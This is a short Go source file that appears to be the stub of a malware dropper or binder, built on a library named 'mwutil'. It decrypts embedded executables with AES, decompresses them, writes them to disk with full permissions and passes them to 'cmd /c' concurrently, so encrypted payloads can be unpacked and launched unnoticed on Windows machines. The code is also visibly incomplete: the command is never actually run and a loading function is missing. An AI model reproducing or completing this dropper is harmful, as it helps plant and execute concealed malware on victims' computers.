package main

import (
	"io/ioutil"
	"os/exec"
	"sync"

	"github.com/Craumix/mwutil"
)

type exepack struct {
	data     []byte
	filename string
}

var executables []exepack
var wg sync.WaitGroup

var iscompressed bool
var encryptionkey []byte

func main() {
	loadDynamic()
	for _, exe := range executables {
		go runExepack(exe, "")
		wg.Add(1)
	}
	wg.Wait()
}

func runExepack(pack exepack, path string) {
	//Encrypting compressed data can be unsafe

	defer wg.Done()

	b := pack.data
	var err error
	exepath := path + "/" + pack.filename

	if len(encryptionkey) == 32 {
		b, err = mwutil.AesDecrypt(encryptionkey, b)
		mwutil.Logif(err)
	}
	if iscompressed {
		b, err = mwutil.GunzipData(b)
		mwutil.Logif(err)
	}

	err = ioutil.WriteFile(exepath, b, 0777)
	mwutil.Logif(err)

	exec.Command("cmd", "/c", exepath)
}
